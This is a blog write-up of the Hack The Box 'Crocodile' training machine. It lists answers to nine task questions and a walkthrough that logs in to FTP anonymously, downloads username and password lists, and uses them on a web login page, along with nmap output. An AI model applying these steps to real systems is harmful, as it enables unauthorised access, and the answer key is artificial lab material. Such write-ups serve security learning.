---
layout: ../../layouts/BlogPost.astro
title: "[Hack The Box] [Starting Point] [Tier 1] Crocodile"
uuid: e1267e42-2f3c-11ed-9e81-c2af19d2d6e3
version: 87
created: Thu, 08 Sep 2022 06:10:03 +0000
tags:
- y-type/resource
- z-class/career/pentest
- x-status/publish/writeup
---

**TASK 1**

**What nmap scanning switch employs the use of default scripts during a scan?** -sC

**TASK 2**

**What service version is found to be running on port 21?** vsftpd 3.0.3

**TASK 3**

**What FTP code is returned to us for the "Anonymous FTP login allowed" message?**230

**TASK 4**

**What command can we use to download the files we find on the FTP server?** get

**TASK 5**

**What is one of the higher-privilege sounding usernames in the list we retrieved?** admin

**TASK 6**

**What version of Apache HTTP Server is running on the target host?** 2.4.41

**TASK 7**

**What is the name of a handy web site analysis plug-in we can install in our browser?** Wappalyzer

**TASK 8**

**What switch can we use with gobuster to specify we are looking for specific filetypes?** -x

**TASK 9**

**What file have we found that can provide us a foothold on the target?** login.php

**SUBMIT FLAG**

Step:

ftp $ip

>anonymous

>get allowed.userlist

>get allowed.userlist.passwd

>exit

cat allowed.userlist

cat allowed.userlist.passwd

http://$ip/login.php

---

Note:

[Crocodile.pdf](/attachments/Crocodile.pdf)

```
$> nmap -sC -sV $ip
Nmap scan report for 10.129.25.81
Host is up (0.24s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.14.33
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Smash - Bootstrap Business Template
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Unix
```